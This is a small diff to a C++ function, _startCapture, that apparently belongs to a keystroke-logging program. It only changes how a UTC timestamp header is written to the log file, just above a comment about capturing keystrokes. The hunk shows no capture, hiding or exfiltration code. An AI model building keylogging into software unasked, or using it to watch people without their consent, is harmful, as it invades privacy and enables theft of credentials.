@@ -112,7 +112,7 @@ static void* _startCapture(void* threadData)
 
         // Write timestamp
         std::time_t time = std::time(nullptr);
-        logFileStream << "\n| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
+        logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
             << "-------------------------------------\n";
 
         // Capture keystrokes (but not releases)
